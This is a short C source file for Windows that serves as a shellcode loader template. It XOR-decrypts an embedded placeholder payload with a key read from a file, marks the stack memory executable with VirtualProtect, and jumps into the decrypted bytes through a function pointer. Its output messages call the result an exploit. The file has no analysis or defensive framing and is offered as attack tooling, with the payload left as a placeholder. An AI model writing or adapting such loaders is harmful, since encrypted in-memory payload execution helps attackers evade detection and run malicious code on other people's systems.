#include <windows.h>
#include <stdio.h>

BOOL make_stack_executable(void *shellcode) {
    MEMORY_BASIC_INFORMATION mbi;
    DWORD oldProtect;

    if (!VirtualQuery(shellcode, &mbi, sizeof(mbi))) {
        printf("Failed to get memory information.\n");
        return FALSE;
    }

    if (!VirtualProtect(mbi.BaseAddress, mbi.RegionSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("Failed to change memory protection.\n");
        return FALSE;
    }

    return TRUE;
}

void decrypt_payload(unsigned char *encrypted_payload, size_t length, const char *keyfile) {
    unsigned char *key = malloc(length);
    if (key == NULL) {
        perror("Failed to allocate memory for key");
        return;
    }


    FILE *fp = fopen(keyfile, "rb");
    if (fp == NULL) {
        perror("Failed to open key file for reading");
        free(key);
        return;
    }
    fread(key, 1, length, fp);
    fclose(fp);

    for (size_t i = 0; i < length; i++) {
        encrypted_payload[i] ^= key[i];
    }

    free(key);
}


int main(int argc, char **argv)
{
volatile char code[] ={#PLACEHOLDER#};
    size_t length = sizeof(code) / sizeof(code[0]);
    decrypt_payload(code, length, "#PLACEHOLDER2#");

if(make_stack_executable(code)){
    printf("Made stack executeable");
}else{
    printf("Error at trying to make stack executeable for exploit");
}

  int (*func)();
  func = (int(*)()) code;
  (int)(*func)();
}